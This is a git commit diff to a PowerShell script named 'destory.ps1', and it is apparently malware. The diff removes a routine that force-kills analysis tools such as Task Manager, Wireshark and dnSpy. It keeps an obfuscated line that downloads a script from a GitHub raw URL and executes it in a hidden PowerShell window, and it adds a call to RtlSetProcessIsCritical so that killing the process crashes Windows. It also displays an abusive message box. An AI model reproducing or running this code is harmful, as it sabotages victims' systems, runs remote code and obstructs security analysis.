33000915b8557843ff00ff44ad45a4cc533e6734
43a1723 <hai1723notgay@gmail.com>
2025-04-10 13:36:18 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -1,20 +1,17 @@
-$2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')
+$code = @"
+using System;
+using System.Runtime.InteropServices;
 
-foreach ($prg in $2kill) {
-    $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
-    if ($rprc) {
-        Stop-Process -Name $prg -Force 
-        Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
-    }
+public class CriticalProcess
+{
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern uint RtlSetProcessIsCritical(bool bNewValue, bool bNeedScb, bool bCheckFlag);
 }
+"@
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+Add-Type -TypeDefinition $code
+[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
 [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
 [System.Windows.Forms.MessageBox]::Show("Analysis is gay!", " Fuck ", "OK", "Warning")
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
